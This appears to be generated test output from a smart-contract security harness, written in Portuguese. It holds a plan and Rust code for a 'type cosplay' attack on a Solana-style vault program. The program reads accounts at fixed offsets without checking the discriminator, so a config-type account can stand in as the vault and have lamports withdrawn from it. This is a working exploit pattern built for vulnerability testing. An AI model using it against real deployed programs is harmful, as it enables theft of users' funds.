{
  "plan": "O ataque COSPLAY explora a desserializacao manual do vault por offsets fixos (8..40 autoridade, 40..48 saldo) sem validar discriminador. Montamos uma conta 'vault' legitima com layout compativel (8 bytes de tag + autoridade + saldo) e um baseline de withdraw bem-sucedido. Em seguida, o ataque substitui a conta vault por uma conta de outro tipo (ex.: uma conta de configuracao) cujo layout nos offsets 8..40 e 40..48 coincide com os campos esperados, mas cujo discriminador (primeiros 8 bytes) difere do vault legitimo. O efeito medido e que o saldo da conta de outro tipo foi decrementado e lamports transferidos, provando que o programa aceitou uma conta de tipo diferente como vault.",
  "scenario": "let authority = Pubkey::new_unique();
let recipient = Pubkey::new_unique();

// Conta vault legitima: 8 bytes de tag + autoridade (32) + saldo (8)
let mut vault_data = vec![0u8; 48];
vault_data[0..8].copy_from_slice(&[1u8, 2, 3, 4, 5, 6, 7, 8]);
vault_data[8..40].copy_from_slice(authority.as_ref());
vault_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());
let vault = account(&env.program_id, &vault_data, Some(2_000_000));

let recipient_acc = wallet(0);

let ix = env.raw_ix(&[IX_WITHDRAW, 100_000u64.to_le_bytes().as_ref()].concat(), &[
    AccountMeta::new(vault.key(), false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new(recipient, false),
]);

let contas = vec![
    (vault.key(), vault.clone()),
    (authority, wallet(0)),
    (recipient, recipient_acc.clone()),
];

let r = env.baseline("withdraw legitimo do vault", &ix, &contas);

// Conta de outro tipo (ex.: config) com layout compativel nos offsets 8..40 e 40..48,
// mas com discriminador diferente do vault legitimo.
let mut fake_data = vec![0u8; 48];
fake_data[0..8].copy_from_slice(&[9u8, 9, 9, 9, 9, 9, 9, 9]);
fake_data[8..40].copy_from_slice(authority.as_ref());
fake_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());
let fake = account(&env.program_id, &fake_data, Some(2_000_000));

let atk_ix = env.raw_ix(&[IX_WITHDRAW, 100_000u64.to_le_bytes().as_ref()].concat(), &[
    AccountMeta::new(fake.key(), false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new(recipient, false),
]);

let atk_contas = vec![
    (fake.key(), fake.clone()),
    (authority, wallet(0)),
    (recipient, recipient_acc.clone()),
];

let r = env.attack("withdraw usando conta de outro tipo como vault", &atk_ix, &atk_contas);
if r.program_result == ProgramResult::Success {
    let fake_after = after(&r, &fake.key());
    let recipient_after = after(&r, &recipient);
    let saldo_restante = read_u64(fake_after.data(), 40);
    env.effect("saldo da conta de outro tipo foi decrementado (tratada como vault)", saldo_restante == 900_000);
    env.effect("lamports foram transferidos para o recipient a partir da conta de outro tipo", recipient_after.lamports() == 100_000);
}"
}

